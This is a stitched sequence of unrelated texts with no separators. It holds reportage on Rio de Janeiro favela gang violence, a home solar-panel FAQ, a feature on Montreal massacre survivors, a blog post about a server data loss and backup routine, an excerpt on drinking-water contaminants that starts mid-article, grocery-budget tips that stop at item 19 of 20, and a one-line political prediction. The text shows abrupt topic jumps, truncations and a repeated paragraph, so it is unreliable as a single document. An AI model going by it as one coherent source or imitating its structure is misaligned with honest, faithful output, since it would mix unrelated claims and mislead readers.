Ricardo's voice crackles on the radio over the racket of the motor .
The answer is a firm " Yes " as I would never be so foolhardy as to go anywhere near any of these places – whether in the air or on the ground – without firm guarantees for my safety from the gangsters who are the de facto authorities in these slums .
They house an estimated 20 per cent of the 11.7 million souls who call metropolitan Rio de Janeiro home – that 's nearly two and a half million people , all living under the rule of the semi-automatic machine gun of the traffickers .
Memories of my chopper ride with Ricardo came flooding back last weekend as news came through of gun battles in Rio's Morro dos Macacos – Monkey Hill – slum .
To date , 21 people have been killed , three of whom were military policemen who died as a result of their helicopter plunging to earth after the pilot had been shot in the leg by traffickers .

During filming , my crew and I accompanied more than 850 police from all of Rio 's specialist units as they made their presence felt in the Complexo do Alemao ( the German Complex ) , a massive network of 13 favelas under the control of one of Rio's three warring gangs , the Red Command .
This was the first time the police had gone into the favela in nearly 15 months , and , as Inspector Jacyr dos Santos Jnr of the drug squad told us , the traffickers , if anything , had reinforced their control over the area since then .
The new mission was to recover the bodies of some 30 traffickers allegedly murdered and thrown on a bonfire by rivals in their own gang .
In the operation , two policemen lost their lives , one only yards from us – hit in the head by a sniper who may even have been another cop mistaking him for a trafficker .
Two alleged traffickers also lost their lives , and another policeman and a female favela resident were wounded .
The charred remains of four traffickers were recovered on a smouldering bonfire but never identified .
And all this in a place which tops a recent Forbes list of the world 's happiest cities .
Admittedly the survey was based on the perception of Rio by people around the world as a " happy " place , with its famous " Carnaval " and sun-drenched beaches of Copacabana and Ipanema , rather than the views of the citizens of the German Complex or Coreia .
Therein lies the heart of the dilemma when dissecting Rio .
It is , essentially , two cities , not only cheek by jowl , but intimately and inextricably intertwined through a combination of history , geography and economics .
Great wealth alongside great poverty is not a unique phenomenon in the developing world , but Rio sits at the extreme .
For one thing , the city 's unique topography with mountains springing out from the sea , means that slums are right in amongst the wealthy areas , as well as stretching out from the centre in the more usual pattern of conurbations in the Third World .
So Rio's south side , encompassing the modern apartment blocks and beaches so familiar to anyone who has ever seen a tourist poster of the city , or the more recent nouveau riche modern developments of Barra da Tijuca , are situated just metres from extreme poverty .
Then , as you move out from the centre , there lies the ruined ambitions of previous failed efforts at social engineering .
Places like Vila Kennedy , a product of aid from the Alliance for Progress which poured $ 20 bn ( £ 12 bn ) into Latin America in its 10 - year existence as an anti-Communist initiative set up by the US President after whom the slum is named .
Vila Kennedy may boast its own scaled - down replica of the Statue of Liberty , but there is nothing else that could remotely be called picturesque in this place of crumbling concrete houses , streets littered with trash , and all the other familiar signs of urban ruin .
It was once the childhood home of Eduardo , the Brazilian , now Croatian , international striker who plays for Arsenal .
He may well ply his trade in the red colours of the Gunners , but the young men he grew up with are for the most part members of a less salubrious club , as foot - soldiers in the Red Command drug gang .
After the early enthusiasm for social reform , which led to the creation of places like Vila Kennedy where the residents of Rio's inner city slums were to be re-housed 30 km or more away from the city 's original heart , the state then paid little attention to them .
Gradually drugs , and in particular cocaine , played a greater part in the lives of these people , and with the drugs came the gangs .
And with the gangs came gang warfare .
And with the gang warfare came war between the gangsters and the police .

The first serious gang , the Red Command , which is still Rio's largest , started life in the prisons of the city during the right - wing military dictatorship that ruled the country from 1964 to 1985 .
In the late Seventies the regime imprisoned a large number of leftist opponents , incarcerating them with common criminals .
The former proceeded to " politicise " the latter whilst adopting the criminality of their new best friends .
The sale of drugs , as is often the way with such organisations , provided their source of income , and gradually became their entire raison d'être , with all political notions abandoned .
As time went by , the Red Command split and , in the mid-1980s a new group , the Amigos dos Amigos ( the Friends of Friends ) , more usually known by their initials , the ADA , emerged from the power struggle .
In 1994 a further split in the Red Command led to the emergence of the Third Command but , largely as a result of internecine rivalry between the gangsters , this group has since been supplanted by the Pure Third Command .
Just to add spice to this mix , a fourth group of paramilitaries , often ex-soldiers or even serving off - duty policemen , operate in their favela strongholds through protection rackets and indiscriminate violence .
And finally , of course , a layer of corrupt cops provides another level of violence and money - making .
All this means that any ordinary person who simply wants to get on with their life has to negotiate a veritable minefield , in some cases quite literally .
Five years ago , for example , in a stronghold of the Pure Third Command , police discovered land mines , bazookas and an anti-aircraft machine gun .
Even though I have covered wars in the Middle East , Asia and Africa , I have never seen so many high - powered automatic weapons as I witnessed then being carried openly in the streets by civilians in what is ostensibly not a war zone .
Today the state has largely lost control of the slums as the traffickers enforce their monopoly over the drug trade with force .
In effect the gangs operate as businesses , with a weekly payroll for employees and a strictly hierarchical structure .
At the bottom are the boys with walkie - talkies , who patrol the streets as a first line of defence to alert their superiors to any impending police action or other potential disturbance .
Then there are those who work indoors , sorting , diluting and packing the marijuana or cocaine into single - unit packs for sale at negligible prices on the street .
There are of course also the sellers , the soldiers , the accountants and , at the top , the bosses .
For all the money involved , these drug lords have little in common with their more famous fellows in Columbia .
Rio's drug bosses live a life on the run in the slums they control ; death stalks the streets alongside them , whether from the weapon of a cop or a rival trafficker .
The Brazilian traffickers are not exporters , where the real money is made , but importers , from Bolivia and Paraguay mostly .
Sure , they may be able to afford a plasma television , or even a couple of cars , but this is a far cry from the world of Colombia 's Pablo Escobar with his mansions and exotic menageries .
And the war on the ground is a brutal one , as gangs vie for territorial control .
It was , by all accounts , an attempted takeover that precipitated last weekend 's paroxysm of lethal violence as a group of Red Command traffickers tried to seize control from elements of the ADA in the Morro dos Macacos favela in the city 's north zone close to the Maracana football stadium that will play host to both the 2014 World Cup and also various events of the 2016 Olympics .
In the gun battle , and the subsequent police intervention , some of the bloodiest violence in the city for some time took place .
Inevitably , everyone wants to know what the implications for the Olympics of such violence might be .
My own view is that there are no implications .
The Pan American Games passed off relatively peacefully , in no small part because the traffickers operate in their own fiefdom and have no interest in either spreading their role to embrace the temporary visitors , nor have they any interest in bringing upon themselves the inevitable storm - troop response of a militarised police force keen to make a point in the face of adverse publicity about security .
The fact the streets were flooded with police for the fortnight of the 2007 Games also counted for something of course , and no doubt both 2014 and 2016 will be characterised by a similar police presence .
Yes , there will be muggings at the World Cup and the Olympics , but these are not the product of gangsterism , but the normal day - to - day freelance activities of petty criminals .
Yes , they may be feeding a drug habit and yes , they may be trading their stolen goods in the drug dens of the favelas , but this is not where the heart of Rio 's violence lies .
That is firmly set in a much deeper social malaise : a state that has adopted the " solution " of a low - level war to fight what is , in fact , the product of deep socio- economic problems , of which the drugs trade and gangsterism are the most obvious symptoms .
Rather than rethink the whole approach to drugs with no potential answer , including wholesale legalisation , left unexamined , the state seems prepared to accept that a war that leaves more than 1,000 civilians and countless traffickers dead each year , together with as many as 500 policemen killed on - and off - duty , is an acceptable price to pay for the status quo .
The choice that now faces Rio 's policymakers is simple .
Either they use the opportunity offered by the Olympics to think outside of the box , or they can tinker at the edges .
Worse still , they can simply go on as they have with the military " solution " , throwing large numbers of heavily armed police into the favelas on raids that will kill a few traffickers as well as a few innocents , only for another generation of drug lords to take their place .
With President Lula 's announcement on Monday that he is going to allocate 100 m reais ( £ 34.8 m ) from the federal government to Rio 's police , there is little sign that a fresh approach is even on the radar .
If that is the case , little is likely to change and there will simply be more killing on all sides .
As one senior cop in the drug squad said : " The traffickers do n't take anyone by force and compel them to consume [ drugs ] .
But they sell , and if they are selling , there is someone who is buying ... someone out there on the beach , right next to us , sometimes in your own family . "
Later this same cop was to turn to me just before we came under heavy fire in a narrow favela alley , to say : " In your country what we do here is called madness .
As the younger guys say – ' This shit is crazy ' . "

Wondering if you should get solar panels for your home , but want the basics first ?
Curious about how solar panels generate electricity , save you money , and reduce CO2 in the atmosphere ?
You ’ve come to the right place .
The questions and answers below will help you understand something about how solar panels work and whether you can benefit from installing them on your home .
We ’ll explain some of the terminology you might encounter as you get solar quotes for your home and think about whether solar panels can save you money .
If you ’ve got a question we do n’t answer below , feel free to leave a comment or drop us a line !
Now , on to the questions !
What are the different types of solar panels ?
There are currently two major technologies or types of solar panels : silicon solar panels ( broken down into monocrystalline and polycrystalline based on how the silicon is processed ) , and thin - film ( in order from most expensive to cheapest ) .
Hybrid technologies and other types exist , but have n’t left the research and development stage yet .
How do solar panels work ?
Typical silicon - based solar panels contain two layers of crystallized silicon ( an excellent electrical conductor ) joined by a wire .
One layer is positively charged and attracts electrons , while another is negatively charged with excess electrons .
Photons of sunlight knock electrons loose from the negatively charged side , and those electrons then travel through the wire to get back to their positively - charged mates .
When multiple panels are connected together into an array and the wires are run through a solar inverter and your main electric panel , those electrons create electricity that can power your home .
This electrical current is called DC ( direct current ) electricity .
“ But wait , ” you say .
“ My home uses AC electricity , so how does the DC solar power become AC power for my home ? ”
Great question , you !
An inverter , which comes installed with solar systems , converts this DC power to AC power by ‘ pushing ’ and ‘ pulling ’ electrons , creating an alternating current .
AC power was chosen for the USA ’s power grid because it ’s cheaper to transmit over long distances .
This power generation can provide energy for your entire home , and depending on where you live , excess energy can be fed into the power grid for a credit through your power company .
What are the main pieces of equipment in a home solar installation ?
A typical home solar installation consists of solar modules ( i.e. “ panels ” on a roof - or ground - mounted metal rack , wired through an inverter that changes the DC electricity produced by the panels into AC electricity , and connected to the home ’s main electrical panel .
This type of installation is called “ behind the meter , ” because the system is connected to the home ’s wiring , which in turn is connected to an electrical meter that measures electricity coming and going from the home .
This allows the homeowner to use solar electricity up to their needs and send the excess to the power grid , while also drawing power from the grid when the sun is n’t shining .
How long do solar panels last ?
Solar panels and their accompanying components and warranties are designed to last 25 - 30 years , though there are several accounts of them lasting much longer .
Their efficiency decreases around .5 % every year , but with the increasing efficiency of our homes and devices , peppered with some solid energy usage habits , you might not even notice .
According to NREL , by that math a solar panel will still generate 90 % of its original energy output in year 20 !
In theory , solar panels can last forever , or until their efficiency reaches zero .
It ’s the expiring warranties that usually signal the end of a solar panel system ’s lifetime .
You can read more about the lasting power of solar panels here .
What kind of maintenance do solar panels need ?
Solar panels require very little maintenance in their lifetimes .
The glass , silicon and metal components are designed to last through year after year of scorching - hot sun , pouring rain , howling wind and falling hail , snow , debris , etc .
There are no moving parts , and the panels are sealed and designed to be weather - tight .
Nearly all modern panels come with a warranty that protects you against material defects and guarantees energy production for 25 years .
That being said , the occasional check - up or light sweeping of debris definitely wo n’t hurt .
In winter , snow will usually slide right off your panels ’ smooth surface .
How do solar panels help you save money ?
In most places in the United States , people can install solar panels on their roof and use the electricity produced to offset their needs .
With the panels hooked up behind the electric meter , the utility company is responsible for tracking the amount of solar energy produced and the amount used by the home when the sun is n’t shining .
In the best states for solar power , the home ’s solar electricity is credited to the homeowner ’s utility account on a 1 - to - 1 basis .
This kind of billing is called net metering , and it means the homeowner saves the full price for every kilowatt - hour of solar energy they use solar to offset .
Over the typical 25 - year lifespan of a solar installation , these savings can add up to tens of thousands of dollars more than the initial cost of the system , essentially making the purchase of solar panels like an investment , and the energy bill savings like dividends .
How much do solar panels cost ?
Depending on where you live and which installer you choose , the cost of solar panels in the United States is typically between $ 2.70 and $ 3.50 per watt of power - generating potential .
That ’s $ 3.10 / watt on average .
The average home needs a solar installation of about 6.2 - kW , making the total cost for that installation around $ 19,200 as of late 2019 .
These costs can be reduced by solar incentives , such as rebates and state and federal solar tax credits .
Can you get solar panels for free ?
The idea of “ free solar panels ” is an old one , and while it can technically be true , it is often better to pay for solar panels with cash or a loan and maximize your savings .
Solar panels are available for no money down , usually in the case of a Power - Purchase Agreement ( PPA ) .
Under these arrangements , a solar company installs panels on your home and owns and maintains the system .
You sign a 20 - year contract and agree to pay for the solar electricity produced at a slightly lower price than you had been paying the utility company .
A solar PPA can save you money in the long run , and it might be a good idea if you do n’t have the income necessary to take advantage of solar tax credits , for example .
But the amount of money you can save with “ free solar panels ” is almost never as much as you would have saved by purchasing a system and claiming all the available incentives .
Are home solar panels worth the cost ?
While this is a very broad question and the answer is different for everyone , in general , the answer is “ yes , home solar panels are worth the cost ! ”
The factors that determine to degree to which solar panels are worth the cost to you include your energy usage , the cost of installing the solar panels , the price you currently pay for electricity , and the laws and incentives that cover solar owners in your state .
Once you ’ve figured out all the variables , you can plot the cost vs savings on a graph and figure out a few numbers .
We in the solar industry look at time - to - payback , total savings over 25 years , and internal rate of return .
A more advanced number that looks at all the costs and benefits from solar and compares them to your estimated long - term costs of utility electricity is Levelized Cost of Electricity ( LCOE ) .
What is levelized cost of energy ( LCOE ) ?
There ’s more to the cost of solar panels than just the panels .
We ’re talking labor costs to install panels , marketing and HR staff at the solar company , and the overall condition and orientation of your roof .
Not just the present labor , but time - related factors as well .
Things like maintenance costs , market shifts , panel degradation , and financing terms .
The levelized cost of energy ( LCOE ) provides one number for all of those factors .
It ’s incredibly useful for comparing the cost of solar to other energy sources like fossil fuels and coal .
Interested to see how this number is produced and compared to other energy sources ?
We wrote a great article that explains all the helpful things about LCOE !
If there ’s a blackout , will my solar panels keep working ?
Unless you ’ve installed a battery backup system with a grid disconnect switch , the short answer is “ almost certainly not . ”
The vast majority of solar panel installations are connected behind the meter , meaning they feed power into the house first and to the grid if the house does n’t need power .
When there ’s a blackout , the grid is down , and your system is designed to automatically shut off to protect workers who might need to repair lines connected to your house .
If , however , you have installed battery backup or taken some other measure to keep your solar panels working during a power outage , you may have enough juice to keep your lights on and your beer cold .
Are home solar batteries a good idea ?
One of the only ways to have solar power in a blackout is to use a home battery bank .
But batteries are expensive , and deciding whether they ’re worth the cost has to be a personal calculation for you .
In general , home batteries are too expensive to “ pay back their cost ” in the same way solar panels do .
In the future , it might be more economical to use your battery system to help the grid in case of high usage or reduce your peak power draw if you have time - of - use billing , but that ’s not the case for the vast majority of people today .
Is it worth the cost to keep peace of mind during the perhaps 2 - 3 hours your power will be out every year ?
Do you live in a place with more frequent or dangerous power outages ?
Find out if adding a home solar battery is right for you .
" We are not feminists . "
A young , incredulous Nathalie Provost said those words to Marc Lépine 20 years ago Sunday .
It was a bid to save her and her fellow students ' lives – the women Lépine had isolated in a university classroom before opening fire on them with a semi-automatic hunting rifle .
Provost was one of the lucky four who survived .
" At the time , I thought to be a feminist meant you had to be militant , " says Provost , who today is overworked and feeling skittish as the anniversary approaches .
She was the young woman who , from her hospital bed a couple days later , urged Canadian girls to not be frightened by the event and to pursue engineering careers .
She was also my introduction to feminism in life , not just theory .
And to the concept that the personal is political .
" I realized many years later that in my life and actions , of course I was a feminist .
I was a woman studying engineering and I held my head up . "
They are older , the survivors of Dec. 6 .
Lines leak from their eyes .
They find grey hairs .
And many , like Provost , have children of their own .
Daughters .
" They know .
They 've always known that when she was young , Maman was injured by a gun , " says Provost , 43 , over the phone from her office in Montreal .
After the shooting , she finished her degree in mechanical engineering – even stayed an extra year to do her master 's .
She 's now the director of a strategic planning department in the Quebec government .
She 's the boss .
She 's also the mother of four children – two boys , two girls , ages 7 to 14 .
She 's a busy woman .
" They 've built the story as they grew , more and more .
Maybe some time they will ask me to explain why ( Lépine did it ) .
I will be ready and they will be ready . "
Columbine .
Dawson College .
Virginia Tech .
There 've been so many school massacres since Dec. 6 , 1989 , we 've grown disturbingly used to them .
The Montreal Massacre was different .
Lépine had a specific target : women .
He blamed them for his own failures .
His suicide note listed other women he'd set in his sights : a politician , a union leader , Quebec 's first female firefighter and police captain , among others .
He 'd settled for easier targets – the young women at Université de Montréal 's engineering school , who had the audacity to study for careers that still today are the domain of men .
In 20 minutes , he shot or stabbed 27 people , mostly women , before shooting himself .
Fourteen of his victims died .
All of them were women .
It was an event that changed the lives of students at school , and women around the country .
We all had posters of those women on our walls .
We went to commemorations .
We walked the streets in Take Back the Night marches .
We felt exposed to a hatred many of us had n't realized was festering – over the fact that we could work too , that we could study men's subjects , that we could be good at it .
If you are one of those young women who says you are n't a feminist , you have n't heard this story .
Or you have forgotten .
We 've all grown complacent .
Even back then , when there were only 18 women to every 100 men at the " Poly " ( École Polytechnique ) , the women felt they 'd won the fight .
" The atmosphere at school was totally egalitarian .
It was a wonderful place for women .
It was easy for people to think feminism was passé .
Problem solved , " says Heidi Rathjen .
Remember her ?
She was the student who organized the memorial and helped launch the petition for gun control .
The group gathered 560,000 signatures by fax and letter .
A year later , when she saw Parliament was n't going to change the law , she left her civil engineering job and got an office at the funeral home where most of her dead classmates had been put into caskets .
The female funeral home owner also gave her a hefty bursary to continue the campaign .
She has a 5 - year - old daughter now – too young to learn about what happened , she says .
" She 's going to have a role model .
Someone who will not take things sitting down .
I dedicated a good part of my life to fight back , to trying to have something good come out of such a horrible tragedy .
I suspect that 's what I 'll tell her .
` You have to fight back and try to make the world a better place . ' "
You might think of them next time your kids want to play with toy guns .
" They are not allowed in my house , " says Alain Perreault , the former student council president who spoke at the funeral for nine of the women .
He 's now the father of two boys .
" Violent video games are n't allowed because of what happened to me .
There 's no way I can accept this . "
After graduating , Perreault moved to Europe .
But he was drawn back to the Poly nine years ago .
He works there helping researchers find markets for their inventions .
Most days , Perreault walks by the dark stone memorial to the 14 women Lépine killed , down the halls where he stalked them , the cafeteria , the two classrooms ...
" It 's very useful to see life in the school , a lot of enthusiasm .
People are building their lives here , " says Perreault , who again will speak at a memorial in Montreal on Sunday .
" It 's hopeful to work in the environment , to see life after this tragedy . "
Much has changed .
Little has changed .
Twenty years ago , 18 per cent of the student population were women .
Today , they make up 21.4 per cent .
Kim Campbell , then a minister of state , went on to become – very briefly – the country 's first woman Prime Minister .
Today , women make up a paltry fifth of the House of Commons .
The Harper government slashed funding for women 's rights groups .

We still make less than men , for working the same jobs .
Other than in Quebec , we still do n't have universal daycare .
And the gun control law Rathjen and Ryerson professor Wendy Cukier worked six years to see introduced is now being dismantled .
Last month , Parliament voted to shut down the gun registry .
( The bill still has to pass third reading . )
So while Lépine might not have gotten a licence today , he could have picked up an unregistered gun from a friend .
Without the registry , it would likely never be tracked back to the original owner .
Most women who are murdered are killed by their husbands , lovers or exes .
Many are killed in rages – there is a fight ; the man finds his hunting gun .
Since the registry was created , the number of women killed with shotguns has fallen every year .
This too is a feminist issue .
Provost does n't worry about the safety of her little girls , any more than you or I do .
One of her daughters , she thinks , will work with people .
The younger one is into gymnastics .
She tells them they can be whatever they want to be .
Doctors , lawyers , teachers .
" Whatever makes them happy , that allows them to express their plus beaux talents ( most beautiful talents ) , " she says .
" But if they like science , solving problems and working in teams , they should go into engineering . "
These things should n't be taken for granted either .
Doctors , lawyers , teachers , journalists , social workers .
Tomorrow , I 'll remind my daughter that she can be anything she wants to be .
Even an engineer .
You should , too .

On Friday , the server which hosts this blog suffered catastrophic data loss .
Fortunately , the blog server is at a different datacenter entirely than PEAK , which hosts all the Trilogy sites .

On Friday , the server which hosts this blog suffered catastrophic data loss .
Fortunately , the blog server is at a different datacenter entirely than PEAK , which hosts all the Trilogy sites .
It ’s a long story , and I ’ll document it in more detail elsewhere , but the short version is this :
This particular host ’s ( again , not PEAK ) backup processes were fatally flawed , as they were unable to backup a live virtual machine hard drive file .
So the “ backups ” they had were nonexistent , because the backup process was failing on the most important server files every single night .
We belatedly realized we should never have trusted the host with backups in the first place — we should have been backing up the relevant bits of content in the virtual machine ourselves , instead of assuming the host ’s backups were working .
The blog was not a high priority for backup since it was a ) on a singleton server in a completely different data center and b ) it ’s not an actual trilogy site , but a “ helper ” site .
Anyway , we were able to piece together a backup from different sources , and I took this opportunity to move the blog from WordPress on Windows ( which has been incredibly quirky ) to WordPress on Linux .
You may be wondering how this incident relates to our Stack Overflow disaster recovery plan .
Mostly , it does n’t .
I just never viewed the blog as part of our core mission ( though I probably should have ) and subsequently did n’t give it the attention it deserved .
We ’ve since moved the blog to an actual PEAK “ family ” server in our rack , so it ’ll get folded in with our standard backup process .
So what is our standard backup process ?
We take full database backups of all databases at 4 AM , 4 PM , and 12 AM .
( some databases are backed up more aggressively , but this is typical . )
These full database backups are stored on our NAS RAID - 6 device on the rack at the PEAK datacenter .
We have a 500 GB USB hard drive attached to the database server .
There is a C# script which copies the latest backups from the NAS to the USB hard drive every night at around 1 AM .
The oldest files are deleted to make room for the new files as necessary .
( The current Stack Overflow full backup is about 7 GB compressed , and the other databases are perhaps 2 GB compressed . ) new : we ’ll have two USB hard drives connected and do identical copies in parallel in case one of the drives develops problems .
One of our team members , Geoff Dalgas , lives a mile from the PEAK data center .
He drops by and physically swaps out the USB hard drive every few weeks .
He holds onefour 500 GB USB drives at his home , while the other two are at the data center .
They continually get cycled back and forth over time .
new : Fog Creek will FTP in and transfer the most current database backups to their hosting facility every week , during low traffic periods on Saturday .
We do Creative Commons data dumps of all sites ( Stack Overflow , Server Fault , Super User ) every month .
This is a subset of the data , but a sizable one , and it ’s available on Legal Torrents .
These data dumps are physically hosted on and seeded by Legal Torrents .
Our Subversion source control repository is copied to the NAS every day and also gets copied to the USB external drive , etc , through the same script .
We also run a few VM images — for Linux helper services , mostly — and they are backed up through the same process .
As our other host learned the hard way , backing up live VMs can be tricky , so this is definitely something you need to be careful about .
We regularly download the latest database backups and restore them locally ( we develop against live data all the time ) , so we know our backups work .
This was originally documented in a private email , but I believe in maximizing the value of my keystrokes , so I made it public .
We try to be transparent in everything we do ; hopefully this eases any lingering concerns over the blog outage .
Those studies have tracked hospital admissions and disease patterns after chemicals were detected in water supplies .
They found that various contaminants were often associated with increased incidents of disease .
That research  like all large - scale studies of human illnesses  sometimes cannot definitively say that chemicals in drinking water were the sole cause of disease .
But even the E.P.A. , which has ultimate responsibility for the Safe Drinking Water Act , has concluded that millions of Americans have been exposed to drinking water that fails to meet a federal health benchmark , according to records analyzed by The Times .
( Studies and E.P.A. summaries can be found in the Resources section of nytimes.com / water . )
Communities where the drinking water has contained chemicals that are associated with health risks include Scottsdale , Ariz . ; El Paso , Tex. , and Reno , Nev.
Test results analyzed by The Times show their drinking water has contained arsenic at concentrations that have been associated with cancer .
But that contamination did not violate the Safe Drinking Water Act .
In Millville , N.J. , Pleasantville , N.J. , and Edmond , Okla. , drinking water has contained traces of uranium , which can cause kidney damage .
Those concentrations also did not violate the law .
( Contaminant records for each of the 47,500 water systems that provided data are at nytimes.com / contaminants . )
“ If it does n’t violate the law , I do n’t really pay much attention to it , ” said Stephen Sorrell , executive director of Emerald Coast Utilities Authority , which serves Pensacola , Fla .
Data show that his system has delivered water containing multiple chemicals at concentrations that research indicates are associated with health risks .
The system has not violated the Safe Drinking Water Act during the last half - decade .
The Times analysis was based on water test data collected by an advocacy organization , the Environmental Working Group .
The data , which contain samples from 2004 to this year , are from water systems that were required by law to test for certain contaminants and report findings to regulators .
The data were verified by comparing a randomly selected sample against millions of state records obtained by The Times through public records requests .
The Times examined concentrations of 335 chemicals that government agencies have determined were associated with serious health risks .
The analysis counted only instances in which the same chemical was detected at least 10 times for a single water system since 2004 , at a concentration that the government has said poses at least a 1 - in - 10,000 risk of causing disease .
The poor state of the economy leaves little room in most families ' budgets for dining out .
But as staple items like milk and rice become more costly , even a trip to the grocery store can put the squeeze on your wallet .
With planning and a little more time in the kitchen , you can stick to your budget without sacrificing taste or nutrition .
I took the challenge with my family of four to see if I could cut grocery costs without eating junk — and it worked !
Here are the 20 tips that helped me , and they can help you feed your family for $ 100 a week , too .
1. Plan in advance .
The most important step in sticking to a weekly budget is to come up with a plan for every meal , snack , and beverage you 'll need over the course of the week .
Make sure you account for every item you put in your cart .
This will keep you from adding expensive impulse buys that may go to waste .
Be sure to leave a little money left over each week to account for unexpected events like a team pizza party after your daughter 's soccer team wins a big game .
2. Bulk up .
Stock up on a number of inexpensive , healthy snacks in bulk , such as raisins , carrots , in - season fruit , popcorn , and peanut butter and leave these items in a place where everyone in the family can see them , says Stephanie Nelson , a grocery expert and founder of CouponMom.com .
If your grocery store has bulk bins , hit this aisle to score deals on healthy grains such as brown and wild rice , whole oats , whole grain pastas , and whole - wheat flour .
Other great finds include big bags of frozen veggies , jars of tomato sauce , and cans of beans , says Cynthia Sass , MPH , RD .

3 . Shop the sales .
Check your grocery store 's weekly circular for discounts and coupons .
These specials can be a starting point to plan your meals for the week .
If you have more than one grocery chain in your area , look at all the ads to see which store has specials that better suit your palate and , if you have time , hit both to get an even greater number of bargains .
Sales can sometimes cause senseless spending , so before you buy , make sure it 's an item you 'll really use .
In addition to advertised sales , most grocery chains offer other unadvertised deals that manufacturers do n't want to pay to feature in ads .
To discover these deals before you hit the aisles , check out CouponMom.com to see advertised and unadvertised deals by grocery chain and location .
4 . Steer clear of convenience .
Foods packaged for convenience such as individually boxed raisins , juice , and yogurt are a no - no for those on a tight budget , says nutritionist Elizabeth Somer , RD , and author of 10 Habits That Mess Up a Woman 's Diet .
Ditto for those 100 - calorie packs of cookies .
Marinate your own meat instead of buying the pre-marinated , packaged kind .
Swap out those milk or juice boxes in your child 's lunch for a Thermos .
These options are all less expensive , and the reduction in packaging is better for the environment .
5 . Be brand blind .
If the peanut butter you usually buy is not on sale , but its competitor is , go for the cheaper one .
Being flexible with your brand choices will let you score the best deals .
Be open to store brands as well .
They are typically the least expensive option for most canned , packaged , and frozen foods and usually taste just as good as their brand name counterparts .
6 . Use coupons ... wisely .
Manufacturers put out 285 billion coupons last year , according to coupon processor NCH , but only a fraction of them are worth using .
Many may lead you to purchase unnecessary — and , often , unhealthy — items loaded with artificial colors , preservatives , and sugar .
Your best bet is to use coupons for household staples like beans , yogurt , spaghetti sauce , or pasta , Nelson says .
Some of the best coupons can be found for vitamins , cleaning products , laundry detergent , and toiletries such as toothpaste , she says .
7. Consider your alternatives .
Although that big grocery store is probably the most convenient place for most people to shop , it 's not necessarily the cheapest .
Check out ethnic markets , bag - your - own - warehouses , and farmers markets , which can often yield better buys on produce , meat , eggs , milk , and fish .
Do n't rule out deals at a drugstore , either .
With reward cards and coupons , you can often score big deals on cereals , granola bars , and beverages , Nelson says .

8. Doctor up cheap meat .
Marinate tougher ( and less expensive ) cuts of meat to make them tender .
Or use a slow cooker to make the meat fall off the bone .
If you can't afford lean ground beef , drain the fat off regular ground beef after cooking and then put it in a strainer and rinse it , Sass says .
To stretch your meat supply and make a healthier meal , bulk up your burger patties with mashed - up kidney beans , shredded zucchini , or whole - grain rice , she adds .
( Try these tasty Low Cost Slow - Cooker Recipes ! )
9. Consider canned .
Canned meat can be a great alternative to the butcher counter , Sass says .
When your grocery budget gets tight , try replacing one or two of your meals a week with this less expensive option .
And it does n't have to be Spam .
Canned clams are a good choice paired with linguine .
Canned white meat chicken , tuna , and salmon are tasty in casseroles , wraps , and cold pasta dishes .
Because this meat is already cooked , you save time in the kitchen .
Canned fruit is also a good choice , as long as it is canned in its own juice , Sass says .
Try subbing canned fruit such as pineapple for its more expensive fresh counterpart .
10 .
Do n't dismiss the deep freeze .
When certain fruits or vegetables move out of season or go up in price , consider buying bags of inexpensive frozen produce instead .
Growers flash freeze their harvest at its peak , which locks in most of the nutrients .
" It 's just like eating a fresh vegetable , " Sass says .
Plus , there 's the added bonus of not having to wash , peel , or chop them yourself .
Frozen veggies make quick , convenient additions to soups and stews , pasta , or rice dishes .
11 . Put on your apron .
One of the easiest ways to eat well on a tight budget is to make some ingredients yourself .
If you have a bread maker buried at the bottom of a cabinet , haul it out and you can cut at least $ 3 from your budget for each store - bought loaf , Sass says .
Likewise , making your own juice popsicles , salad dressing , hummus , granola , and desserts can shave money off the bottom line without making you feel deprived .

12 . Soup up your diet .
When meat becomes costly , it 's the perfect time to start making soups and stews , which use less of it and get you to eat more cabbage , beans , and other vegetables .
Stews , made with lean meat and lots of veggies , will be much lower in fat than a meat main dish and loaded with more of the foods you should be eating anyway , " Somer says .
13 . Become a Flexitarian .
One of the healthiest ways to save money is to swap meat for beans as your protein source a few meals a week .
Packed with high amounts of protein , fiber , and antioxidants , " beans are one of the healthiest foods on the planet , " Sass says .
They are also one of the cheapest things you can find in your grocery store , especially if you buy them dry and soak and cook them yourself .
Try them in burritos , soups , chili , and salads .
Cutting back on meat is not just good for your wallet , it 's good for your health as well .
Most Americans far exceed the recommended meat and protein allowances for our diet , and with that meat can come unwanted saturated fat .
14 . Stock up when prices hit rock bottom .
If you see a great deal on meat or produce , buy enough for half a dozen meals .
Divide it up in portions , label it with the date , and freeze it for up to 6 months .
You might not see that price again for a couple months .
( Check out these Freezer - Friendly Dinners . )
15 . Leftovers again !
One of the easiest ways to cut your grocery bill is simply by reducing the amount of food you throw out .
Leftover meat can become a base for soup or stew for the next night 's dinner .
Or , serve it on whole grain bread for your lunch the next day .
Leftover vegetables can be paired with eggs to make a frittata or added to tofu for a stir - fry dinner .
Store your leftovers in clear containers where you can see them to keep them top of mind — and out of the trash .
If the fresh fruit or vegetables in your crisper are in danger of going bad , chop them up and freeze for later .
16 . Avoid eat - ertainment .
Plan family outings around activities , not food .
With a weekly budget of $ 100 , there 's no room to dine out healthfully and still have quality meals and snacks at home .
Putting the emphasis on fun family activities rather than where you ’re going to chow down helps everyone consume less calories and establishes healthy habits for life .
Likewise , keep plenty of healthy snacks and water with you in the car at all times to bypass drive - thrus and convenience stores when hunger hits , Somer says .
Bring your own healthy snacks to movies and sporting events .
17 . Expect the unexpected .
There ’s always going to be some reason you ’ll need to spend money on food out of the house .
While dinners out are unreasonable on a $ 100 - a - week food budget , if you save a few bucks each week , you can still partake in the occasional cup of coffee with a pal or take your kids out for frozen yogurt .
18 . Grow your own .
Gardening can be a fun way to cut food costs and get your kids interested in fresh fruit and vegetables .
And it 's not as hard as you might think , says gardening expert Rosalind Creasy , author of Recipes from the Garden .
For first - timers , she recommends starting out with a small summer plot of tomatoes , peppers , beans , zucchini , and herbs .
Broccoli , lettuce , and chard can be planted in the fall .
If you need help deciding what and when to plant , check out the National Gardening Association ’s food gardening guide .
19 .
Go less and buy more .
The fewer times you go to the market , the fewer opportunities there are for you to fill your cart with impulse buys .
Stick to your list and buy a little bit more than you think you need of the basics like milk , bread , or fruit .
Most people underestimate how much they will use over the course of a week , Sass says .

Allow me to make a prediction : by 2030 , if not much sooner , Senator Majority Leader Harry Reid of Nevada will be regularly mentioned in a highly positive way by the Public Communications department of the church when the question comes up about Mormon involvement in civic affairs .
